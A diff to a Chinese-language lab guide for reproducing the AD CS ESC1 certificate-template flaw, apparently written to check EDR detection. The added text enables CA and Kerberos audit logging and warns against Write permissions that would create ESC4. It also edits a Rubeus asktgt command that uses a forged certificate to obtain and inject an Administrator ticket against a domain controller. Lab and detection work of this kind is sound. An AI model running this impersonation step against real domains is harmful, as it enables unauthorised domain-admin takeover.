@@ -11,6 +11,37 @@
 
 ---
 
+## ⚠️ 前置作業：啟用稽核日誌 (AD CS 主機端)
+
+**這一步至關重要。** 若不啟用以下稽核原則，您將無法在 Windows Event Log 中看到關鍵的攻擊跡象 (4886/4887/4768)，導致 EDR 驗證失效。
+
+### 1. 啟用 CA 服務稽核 (針對 Event ID 4886/4887)
+在 AD CS 主機上執行：
+1.  開啟 `certsrv.msc`。
+2.  右鍵點擊 CA 名稱 (`sme-SME-SWP-W-AD-CA`) -> **Properties (內容)**。
+3.  切換到 **Auditing (稽核)** 頁籤。
+4.  勾選 **Issue and manage certificate requests (發行和管理憑證要求)**。
+5.  點擊 **OK**，並重新啟動 CA 服務：
+    ```powershell
+    Restart-Service CertSvc
+    ```
+
+### 2. 啟用 Windows 進階稽核原則 (針對 Event ID 4768)
+在 AD CS 主機 (以系統管理員身分) 執行 PowerShell：
+
+```powershell
+# 啟用憑證服務稽核 (產生 4886, 4887)
+auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
+
+# 啟用 Kerberos 驗證稽核 (產生 4768 - PKINIT)
+auditpol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
+
+# 啟用登入稽核 (產生 4624)
+auditpol /set /subcategory:"Logon" /success:enable /failure:enable
+```
+
+---
+
 ## 第一階段：漏洞環境建置 (AD CS 主機端)
 
 此階段在 AD CS 主機上建立一個具有 ESC1 漏洞特徵的憑證範本。
@@ -23,7 +54,7 @@
     *   **Request Handling**: 勾選 `Allow private key to be exported`。
     *   **Subject Name**: 選擇 `Supply in the request` (⚠️ 核心漏洞點)。
     *   **Extensions**: 確認 `Application Policies` 包含 `Client Authentication`。
-    *   **Security**: 加入 `Domain Users` 並勾選 `Read` 與 `Enroll`。
+    *   **Security**: 加入 `Domain Users` 並勾選 `Read` 與 `Enroll` (⚠️ 確保未勾選 Write 相關權限，否則會變成 ESC4)。
     *   **Issuance Requirements**: 確認 `Manager approval` **未勾選**。
 
 ### 步驟 2：發佈範本
@@ -62,8 +93,8 @@
 # 讀取 PEM 內容並移除換行 (直接使用 Base64 字串，不需轉檔)
 $pem = (Get-Content ".\admin.pem" -Raw).Replace("`r`n","").Replace("`n","")
 
-# 使用 Rubeus 進行 PKINIT
-.\Rubeus.exe asktgt /user:Administrator /certificate:$pem /domain:sme.local /dc:10.0.0.206 /ptt
+# 使用 Rubeus 進行 PKINIT (預設 PFX 密碼為 certify)
+.\Rubeus.exe asktgt /user:Administrator /certificate:$pem /password:certify /domain:sme.local /dc:10.0.0.206 /ptt
 ```
 
 **預期結果**: 顯示 `[+] Ticket successfully imported!`，並可存取 DC (e.g., `dir \\10.0.0.206\c$`)。
